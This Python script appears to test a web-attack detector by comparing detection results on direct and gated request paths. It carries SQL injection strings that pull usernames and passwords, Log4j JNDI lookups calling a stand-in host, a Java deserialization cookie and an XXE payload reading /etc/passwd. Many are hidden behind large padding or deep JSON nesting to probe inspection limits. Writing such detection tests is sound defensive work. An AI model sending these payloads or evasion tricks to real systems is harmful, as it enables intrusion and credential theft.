import sys, json; sys.path.insert(0, sys.argv[1])
from harness import *
from urllib.parse import quote
def enc(s): return quote(s, safe="")
SQ = "x' UNION SELECT username,password FROM users--"
tests = []
tests.append(("query pad 2100 then payload", dict(target="/search?pad=" + "A"*2100 + "&q=" + enc(SQ))))
tests.append(("query pad 1900 then payload", dict(target="/search?pad=" + "A"*1900 + "&q=" + enc(SQ))))
tests.append(("UA log4j after 2100 pad", dict(target="/", headers={"user-agent": "Mozilla/5.0 " + "A"*2100 + " ${jndi:ldap://x.example/a}"})))
tests.append(("X-Api-Version log4j", dict(target="/", headers={"x-api-version": "${jndi:ldap://x.example/a}"})))
tests.append(("X-Api-Key log4j (sensitive hdr)", dict(target="/", headers={"x-api-key": "${jndi:ldap://x.example/a}"})))
tests.append(("Cookie sqli", dict(target="/", headers={"cookie": "lang=en' UNION SELECT username,password FROM users--"})))
tests.append(("Cookie java deser", dict(target="/", headers={"cookie": "rememberMe=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ"})))
tests.append(("Cookie log4j", dict(target="/", headers={"cookie": "x=${jndi:ldap://x.example/a}"})))
body_json_pad = json.dumps({"pad": "A"*4200, "q": SQ})
tests.append(("JSON body payload after 4200B pad", dict(target="/api/search", method="POST", ct="application/json", body=body_json_pad)))
tests.append(("form body payload after 4200B pad", dict(target="/api/search", method="POST", ct="application/x-www-form-urlencoded", body="pad=" + "A"*4200 + "&q=" + enc(SQ))))
tests.append(("XML XXE after 4200B comment", dict(target="/api/xml", method="POST", ct="application/xml", body='<?xml version="1.0"?><!--' + "A"*4200 + '--><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>')))
leaves = {"x": [""]*128, "q": SQ}
tests.append(("JSON 128 empty leaves then payload (" + str(len(json.dumps(leaves))) + "B)", dict(target="/api/search", method="POST", ct="application/json", body=json.dumps(leaves))))
deep = SQ
obj = {"q": deep}
for _ in range(17): obj = {"a": obj}
tests.append(("JSON depth 18 payload", dict(target="/api/search", method="POST", ct="application/json", body=json.dumps(obj))))
tests.append(("JSON key holds payload", dict(target="/api/search", method="POST", ct="application/json", body=json.dumps({SQ: 1}))))
for name, kw in tests:
    d = web(run([direct_event(**kw)])[0]); g = web(run([gate_event(**kw)])[0])
    print(f"{name:42s} direct={[x for x in d if x.startswith('web.')]}{'+sigma' if any(x.startswith('sigma') for x in d) else ''} gate={[x for x in g if x.startswith('web.')]}{'+sigma' if any(x.startswith('sigma') for x in g) else ''}")
